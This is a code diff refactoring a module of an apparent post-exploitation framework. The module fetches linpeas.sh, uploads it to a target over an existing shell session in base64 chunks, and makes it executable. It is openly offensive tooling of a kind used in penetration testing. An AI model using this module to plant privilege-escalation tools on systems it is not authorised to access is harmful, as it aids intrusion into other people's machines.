@@ -11,19 +11,24 @@ _CHUNK_BYTES = 4096
 _LINPEAS_URL = (
     "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
 )
-_REMOTE_PATH = "/tmp/linpeas.sh"
-
-_INTER_CHUNK_DELAY = 0.05
 
 
 class UploadLinpeas(KoiModule):
     name = "linpeas_upload"
-    description = "Upload linpeas.sh to the target via base64 chunks over the existing session."
-    usage = "linpeas_upload <id> <optional_path>"
+    description = "Upload linpeas.sh to the target via base64 chunks."
+    usage = "linpeas_upload <id> [-p <path>] [-d <delay>]"
+    arguments = [
+        {"flags": ["-p", "--path"],  "default": "/tmp",  "help": "Remote directory"},
+        {"flags": ["-d", "--delay"], "default": 0.05, "type": float, "help": "Delay between chunks"},
+    ]
 
     def run(self) -> None:
-        _REMOTE_PATH = f"{self.args[0]}/linpeas.sh" if self.args else "/tmp/linpeas.sh"
+        remote_path = f"{self.args.path}/linpeas.sh"
+        delay = self.args.delay
         
+        self.status(f"Uploading to {remote_path}")
+        self.status(f"Delay set to {delay:.2f} seconds")
+
         # 1. Download linpeas locally
         self.status(f"Downloading linpeas.sh from GitHub…")
         try:
@@ -48,7 +53,7 @@ class UploadLinpeas(KoiModule):
         self.status(f"Splitting into {total} chunks of ~{_CHUNK_BYTES // 1024}KB…")
 
         # 3. Initialise remote file
-        if not self.sendline(f"printf '' > {_REMOTE_PATH}"):
+        if not self.sendline(f"printf '' > {remote_path}"):
             self.err("Session appears to be dead.")
             return
         time.sleep(0.15)
@@ -57,9 +62,9 @@ class UploadLinpeas(KoiModule):
         self.status("Uploading…")
         try:
             for i, chunk in enumerate(chunks, start=1):
-                cmd = f"printf '%s' '{chunk}' | base64 -d >> {_REMOTE_PATH}"
-                if not self.sendline(cmd):
-                    self.err(f"Session died at chunk {i}/{total}.")
+                result = self.exec(f"printf '%s' '{chunk}' | base64 -d >> {remote_path}", timeout=10)
+                if not result.success:
+                    self.err(f"Chunk {i}/{total} failed (rc={result.returncode})")
                     return
 
                 pct = int(i / total * 100)
@@ -67,7 +72,7 @@ class UploadLinpeas(KoiModule):
                 self.ui.print_status_line(
                     f"  [{bar}] {pct:3d}%  chunk {i}/{total}"
                 )
-                time.sleep(_INTER_CHUNK_DELAY)
+                time.sleep(delay)
 
         except KeyboardInterrupt:
             print()
@@ -80,15 +85,15 @@ class UploadLinpeas(KoiModule):
         print()
 
         # 5. Make it executable
-        self.sendline(f"chmod +x {_REMOTE_PATH}")
+        self.sendline(f"chmod +x {remote_path}")
         time.sleep(0.1)
 
         self.sendline(
-            f"wc -c < {_REMOTE_PATH} | awk '{{print \"remote size: \" $1 \" bytes\"}}'"
+            f"wc -c < {remote_path} | awk '{{print \"remote size: \" $1 \" bytes\"}}'"
         )
         time.sleep(0.1)
 
         self.box("Upload complete", {
             "local size":  f"{len(raw)} bytes  ({size_kb:.1f} KB)",
-            "remote path": _REMOTE_PATH,
+            "remote path": remote_path,
         })
